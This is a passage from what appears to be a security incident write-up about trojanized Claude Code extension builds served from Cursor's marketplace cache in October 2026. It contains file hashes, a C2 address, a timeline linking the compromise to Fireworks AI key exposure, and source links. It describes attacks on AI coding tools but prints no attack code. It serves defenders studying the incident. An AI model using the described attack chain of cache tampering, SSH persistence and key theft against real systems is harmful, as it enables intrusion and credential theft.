| **Modified VSIX (`darwin-arm64`)** | `2.1.312` | `fcbb327e38e61c4fec795e0d0591f52cd1014b813d20a5912104953c3a17c364` | `e0d64d53e802a0217ba6f0e656ed2f20` |
| **Modified VSIX (`win32-x64`)** | `2.1.312` | `3de1722901165769893bef57c72594e9a54459faa23f3091b136b79966edd081` | `bd3b71ddf3d0cc3af76249afd2c0eda1` |
| **Modified VSIX (`darwin-arm64`)** | `2.1.313` | `80402fdcad8799285fd93044976973ca000da7995fb93363f819bb8e4f84ee6c` | `34e491161e056c9b899a79b602ac73b9` |
| **Modified VSIX (`win32-x64`)** | `2.1.313` | `6786ec90cbd45949695bd7805c9fbb26cfc91bc5fc897de0183d9bcb9cb21731` | `7838a3be2ca0ff08c1bdb160ef516d39` |

---

## 7. Timeline and Current State

| Date / Window | Event & Verified Source |
|---|---|
| **Aug 3 – Oct 7, 2026** | First security incident at Fireworks AI involving stolen internal credentials and a service vulnerability; investigated with Palo Alto Networks Unit 42 (`fireworks.ai/security/bulletins`). |
| **Oct 6 – Oct 10, 2026** | Fireworks AI detects unauthorized activity (Oct 6, 9 AM PT), notifies affected accounts, rotates employee/service-account keys, and publishes its October 10 security bulletin. |
| **Oct 23 – Oct 30, 2026** | Second Fireworks AI incident via a compromised third-party cloud provider hosting Fireworks R&D machines; investigated with AprosSyber. |
| **Oct 29, 2026 (02:27 AM – 01:35 PM PT)** | ~11-hour exposure window in which trojanized `Anthropic.claude-code` (`2.1.312` and `2.1.313`) builds are served from the Cursor VS Code Extension Marketplace cache to at most ~5,000 installations. |
| **Oct 29 – Oct 30, 2026** | Cursor removes tampered builds, takes the marketplace offline, coordinates C2 (`134.209.82.225`) takedown, publishes IoCs and `remediate-macos.sh` / `remediate-windows.ps1`, and updates IoCs on Oct 30 at 11:30 AM PT. |
| **Nov 1, 2026** | Last observed attacker activity against Cursor systems is blocked; Cursor rebuilds the extension marketplace and moves inference traffic off Fireworks AI. |
| **Nov 9 – Nov 17, 2026** | Fireworks AI publishes investigation updates (Nov 9 & Nov 17) detailing both Aug–Oct incidents and LLMJacking links; Cursor publishes its full root-cause postmortem on Nov 13 tracing the attack chain to the Fireworks bucket key and 2025 non-Privacy-Mode traces. |

---

## 8. Primary Sources & References

1. [Cursor Security Notice: Malicious Version of `Anthropic.claude-code` (`2.1.312` and `2.1.313`)](https://cursor.com/blog/claude-code-extension-security-notice) — Primary October 29/30, 2026 advisory detailing the 11-hour exposure window, payload behaviors, VSIX/JS hashes, network/SSH IoCs, and cleanup instructions.
2. [Cursor Security Incident Update (November 13, 2026)](https://cursor.com/blog/security-incident-update) — Root-cause postmortem tracing the intrusion to the Fireworks AI key exposure, 2025 non-Privacy-Mode trace leakage (`<0.05%` traces, `<0.01%` unredacted keys), and direct cache tampering bypassing Open VSX.
3. [Fireworks AI Security Bulletins](https://fireworks.ai/security/bulletins) — Vendor disclosures (October 10, November 9, and November 17, 2026) documenting the two August–October 2026 incidents and Unit 42 / AprosSyber investigations.
4. [Cursor Official Remediation Scripts (`remediate-macos.sh` & `remediate-windows.ps1`)](https://cursor.com/static/security/claude-code-extension/remediate-macos.sh) — Forensic cleanup scripts revealing the missing-newline `authorized_keys` append bug, persistence unit paths, and `localhost:22` listener check ([Windows script](https://cursor.com/static/security/claude-code-extension/remediate-windows.ps1)).
5. [Check Point Research: Caught in the Hook — RCE and API Token Exfiltration Through Claude Code Project Files](https://research.checkpoint.com/) — Foundational early-2026 research documenting `CVE-2025-59536` (`.mcp.json` / hook pre-trust RCE) and `CVE-2026-21852` (`ANTHROPIC_BASE_URL` pre-trust API key exfiltration).
6. [Microsoft Security Blog & Threat Intelligence Analyses](https://www.microsoft.com/en-us/security/blog/) — Independent verification confirming Microsoft Visual Studio Marketplace and npm `@anthropic-ai/claude-code` were unaffected, alongside technical analysis of the 66-line IIFE SSH loader.
7. [Hak5 Threat Wire: Industry Commentary on AI Extension Supply-Chain Risks](https://www.youtube.com/watch?v=x-fBu4FlP2Y) — Broadcast overview contextualizing how developer marketplace compromises intersect with broader AI coding tool trust assumptions.

---

**Related:**
- [Local-AI-And-Agent-Security-Threat-Model-Nov-2026](Local-AI-And-Agent-Security-Threat-Model-Nov-2026.md) — Maps the 5-layer host execution threat model when local models and agent harnesses wield shell and filesystem permissions.
- [HTTP-Egress-Credential-Proxies-Vs-MCP-Gateways-Nov-2026](HTTP-Egress-Credential-Proxies-Vs-MCP-Gateways-Nov-2026.md) — Explains why removing static API credentials from agent environments and injecting them at an egress proxy prevents trace and extension secret theft.
- [LiteLLM-1.107.0-Supply-Chain-Compromise-Oct-2026](LiteLLM-1.107.0-Supply-Chain-Compromise-Oct-2026.md) — Compare how an unrevoked credential led to PyPI release pipeline poisoning and startup `.pth` credential theft across AI infrastructure.
- [Polymarket-DebugBear-Supply-Chain-Attack-Oct-2026](Polymarket-DebugBear-Supply-Chain-Attack-Oct-2026.md) — Compare upstream third-party cache/CDN tampering and shared-runtime privilege abuse in browser SPAs versus IDE Extension Hosts.
- [OpenCode-Console-API-Key-Breach-And-Distillation-Oct-2026](OpenCode-Console-API-Key-Breach-And-Distillation-Oct-2026.md) — Examine the credential blast radius when developer AI coding tools and API consoles experience unauthorized access.
